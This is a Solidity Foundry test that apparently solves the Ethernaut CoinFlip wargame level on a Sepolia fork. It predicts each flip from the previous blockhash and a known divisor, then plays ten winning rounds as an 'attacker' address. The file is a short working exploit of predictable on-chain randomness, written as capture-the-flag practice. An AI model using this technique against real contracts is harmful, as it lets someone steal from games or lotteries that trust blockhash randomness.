// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";

interface ICoinflip{
    function flip(bool _guess) external returns (bool);
    function consecutiveWins() external view returns (uint256);
}

contract Coinflip is Test {

    address constant public TARGET_ADDRESS = 0x333b591DEDDb356407bc992fe64f474c21b25DC0;
    uint256 constant public TOTAL_GAMES = 10;
    uint256 constant public FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    ICoinflip target;
    address attacker;

    function setUp()  public {
        string memory rpcUrl = vm.envString("SEPOLIA_RPC_URL");
        vm.createSelectFork(rpcUrl);

        target = ICoinflip(TARGET_ADDRESS);
        attacker = makeAddr("attacker");
    }

    /* This will fail because we are not on live network
        so blockhash will not be able to calculate upcoming 
        block's hash and return 0.
        Write it on script and deploy on live network
     */
    function testCoinflip() public {
        // Arrange

        // Act
        for(uint256 index = 1 ; index <= TOTAL_GAMES ; index++){
            vm.startPrank(attacker);
            uint256 blockValue = uint256(blockhash(block.number - 1));

            uint256 coinFlip = blockValue / FACTOR;
            bool side = coinFlip == 1 ? true : false;
            target.flip(side);
            vm.stopPrank();
        }

        // Assert
        assertEq(target.consecutiveWins() , TOTAL_GAMES);
    }

}